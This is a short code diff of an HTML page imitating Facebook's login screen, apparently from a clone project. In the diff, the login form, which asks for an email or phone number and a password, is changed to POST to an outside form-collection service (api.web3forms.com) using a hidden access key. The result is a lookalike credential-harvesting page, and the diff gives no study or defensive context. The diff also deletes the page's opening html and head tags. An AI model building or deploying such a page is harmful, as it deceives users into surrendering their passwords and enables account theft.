@@ -1,8 +1,5 @@
 
-<html lang="en">
 
-<head>
-    <meta charset="UTF-8">
     <title>Facebook-login-signup</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="icon" href="Facebook_logo_(2023).svg.png">
@@ -231,7 +228,9 @@
                 <p>Connect with friends and the world </p>
                 <p> around you on Facebook.</p>
             </div>
-            <form action="#">
+            <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="a1633aa9-4e14-4e68-9b69-05f2a66f61c3">
+                
                 <input type="email" placeholder="Email or phone number"
                     required>
                 <input type="password" placeholder="Password" required>
